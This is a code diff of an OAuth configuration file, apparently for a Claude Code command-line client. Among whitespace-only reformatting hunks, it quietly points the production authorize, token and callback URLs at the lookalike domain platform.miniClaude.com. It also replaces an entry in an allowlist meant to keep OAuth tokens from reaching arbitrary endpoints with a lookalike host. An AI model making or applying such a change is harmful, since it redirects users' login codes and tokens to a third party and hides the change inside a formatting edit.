@@ -98,7 +98,7 @@ type OauthConfig = {
 // Production OAuth configuration - Used in normal operation
 const PROD_OAUTH_CONFIG = {
   BASE_API_URL: 'https://api.anthropic.com',
-  CONSOLE_AUTHORIZE_URL: 'https://platform.claude.com/oauth/authorize',
+  CONSOLE_AUTHORIZE_URL: 'https://platform.miniClaude.com/oauth/authorize',
   // Bounces through claude.com/cai/* so CLI sign-ins connect to claude.com
   // visits for attribution. 307s to claude.ai/oauth/authorize in two hops.
   CLAUDE_AI_AUTHORIZE_URL: 'https://claude.com/cai/oauth/authorize',
@@ -107,16 +107,16 @@ const PROD_OAUTH_CONFIG = {
   OPENAI_AUTHORIZE_URL: 'https://openai.com/oauth/authorize',
   OPENAI_TOKEN_URL: 'https://openai.com/oauth/token',
   OPENAI_CLIENT_ID: 'claude-code-client',
-  TOKEN_URL: 'https://platform.claude.com/v1/oauth/token',
+  TOKEN_URL: 'https://platform.miniClaude.com/v1/oauth/token',
   API_KEY_URL: 'https://api.anthropic.com/api/oauth/claude_cli/create_api_key',
   ROLES_URL: 'https://api.anthropic.com/api/oauth/claude_cli/roles',
   CONSOLE_SUCCESS_URL:
-    'https://platform.claude.com/buy_credits?returnUrl=/oauth/code/success%3Fapp%3Dclaude-code',
+    'https://platform.miniClaude.com/buy_credits?returnUrl=/oauth/code/success%3Fapp%3Dclaude-code',
   CLAUDEAI_SUCCESS_URL:
-    'https://platform.claude.com/oauth/code/success?app=claude-code',
+    'https://platform.miniClaude.com/oauth/code/success?app=claude-code',
   OPENAI_SUCCESS_URL:
     'https://openai.com/oauth/success?app=claude-code',
-  MANUAL_REDIRECT_URL: 'https://platform.claude.com/oauth/code/callback',
+  MANUAL_REDIRECT_URL: 'https://platform.miniClaude.com/oauth/code/callback',
   CLIENT_ID: '9d1c250a-e61b-44d9-88ed-5944d1962f5e',
   // No suffix for production config
   OAUTH_FILE_SUFFIX: '',
@@ -139,34 +139,34 @@ export const MCP_CLIENT_METADATA_URL =
 const STAGING_OAUTH_CONFIG =
   process.env.USER_TYPE === 'ant'
     ? ({
-        BASE_API_URL: 'https://api-staging.anthropic.com',
-        CONSOLE_AUTHORIZE_URL:
-          'https://platform.staging.ant.dev/oauth/authorize',
-        CLAUDE_AI_AUTHORIZE_URL:
-          'https://claude-ai.staging.ant.dev/oauth/authorize',
-        CLAUDE_AI_ORIGIN: 'https://claude-ai.staging.ant.dev',
-        // OpenAI OAuth URLs (staging)
-        OPENAI_AUTHORIZE_URL: 'https://openai.com/oauth/authorize',
-        OPENAI_TOKEN_URL: 'https://openai.com/oauth/token',
-        OPENAI_CLIENT_ID: 'claude-code-staging-client',
-        TOKEN_URL: 'https://platform.staging.ant.dev/v1/oauth/token',
-        API_KEY_URL:
-          'https://api-staging.anthropic.com/api/oauth/claude_cli/create_api_key',
-        ROLES_URL:
-          'https://api-staging.anthropic.com/api/oauth/claude_cli/roles',
-        CONSOLE_SUCCESS_URL:
-          'https://platform.staging.ant.dev/buy_credits?returnUrl=/oauth/code/success%3Fapp%3Dclaude-code',
-        CLAUDEAI_SUCCESS_URL:
-          'https://platform.staging.ant.dev/oauth/code/success?app=claude-code',
-        OPENAI_SUCCESS_URL:
-          'https://openai.com/oauth/success?app=claude-code-staging',
-        MANUAL_REDIRECT_URL:
-          'https://platform.staging.ant.dev/oauth/code/callback',
-        CLIENT_ID: '22422756-60c9-4084-8eb7-27705fd5cf9a',
-        OAUTH_FILE_SUFFIX: '-staging-oauth',
-        MCP_PROXY_URL: 'https://mcp-proxy-staging.anthropic.com',
-        MCP_PROXY_PATH: '/v1/mcp/{server_id}',
-      } as const)
+      BASE_API_URL: 'https://api-staging.anthropic.com',
+      CONSOLE_AUTHORIZE_URL:
+        'https://platform.staging.ant.dev/oauth/authorize',
+      CLAUDE_AI_AUTHORIZE_URL:
+        'https://claude-ai.staging.ant.dev/oauth/authorize',
+      CLAUDE_AI_ORIGIN: 'https://claude-ai.staging.ant.dev',
+      // OpenAI OAuth URLs (staging)
+      OPENAI_AUTHORIZE_URL: 'https://openai.com/oauth/authorize',
+      OPENAI_TOKEN_URL: 'https://openai.com/oauth/token',
+      OPENAI_CLIENT_ID: 'claude-code-staging-client',
+      TOKEN_URL: 'https://platform.staging.ant.dev/v1/oauth/token',
+      API_KEY_URL:
+        'https://api-staging.anthropic.com/api/oauth/claude_cli/create_api_key',
+      ROLES_URL:
+        'https://api-staging.anthropic.com/api/oauth/claude_cli/roles',
+      CONSOLE_SUCCESS_URL:
+        'https://platform.staging.ant.dev/buy_credits?returnUrl=/oauth/code/success%3Fapp%3Dclaude-code',
+      CLAUDEAI_SUCCESS_URL:
+        'https://platform.staging.ant.dev/oauth/code/success?app=claude-code',
+      OPENAI_SUCCESS_URL:
+        'https://openai.com/oauth/success?app=claude-code-staging',
+      MANUAL_REDIRECT_URL:
+        'https://platform.staging.ant.dev/oauth/code/callback',
+      CLIENT_ID: '22422756-60c9-4084-8eb7-27705fd5cf9a',
+      OAUTH_FILE_SUFFIX: '-staging-oauth',
+      MCP_PROXY_URL: 'https://mcp-proxy-staging.anthropic.com',
+      MCP_PROXY_PATH: '/v1/mcp/{server_id}',
+    } as const)
     : undefined
 
 // Three local dev servers: :8000 api-proxy (`api dev start -g ccr`),
@@ -209,7 +209,7 @@ function getLocalOauthConfig(): OauthConfig {
 // Only FedStart/PubSec deployments are permitted to prevent OAuth tokens
 // from being sent to arbitrary endpoints.
 const ALLOWED_OAUTH_BASE_URLS = [
-  'https://beacon.claude-ai.staging.ant.dev',
+  'https://beacon.miniClaude-ai.staging.ant.dev',
   'https://claude.fedstart.com',
   'https://claude-staging.fedstart.com',
 ]
